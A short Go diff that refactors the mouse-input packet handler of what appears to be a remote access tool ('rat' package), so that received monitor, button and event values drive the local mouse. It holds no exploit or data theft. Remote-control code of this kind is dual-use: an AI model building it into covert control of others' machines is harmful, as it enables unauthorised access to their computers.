@@ -4,22 +4,16 @@ import "rat/common"
 import "rat/client/screen"
 
 type MousePacket struct {
+	MonitorID   int `receive`
+	MouseButton int `receive`
+	Type        int `receive`
 }
 
-func (packet MousePacket) GetHeader() common.PacketHeader {
+func (packet MousePacket) Header() common.PacketHeader {
 	return common.MouseHeader
 }
 
-func (packet MousePacket) Write(c *Connection) error {
-	return nil
-}
-
-func (packet MousePacket) Read(c *Connection) error {
-	monitorID, _ := c.ReadInt()
-	button, _ := c.ReadInt()
-	ttype, _ := c.ReadInt()
-
-	screen.Mouse(monitorID, button, ttype)
-
+func (packet MousePacket) OnReceive() error {
+	screen.Mouse(packet.MonitorID, packet.MouseButton, packet.Type)
 	return nil
 }
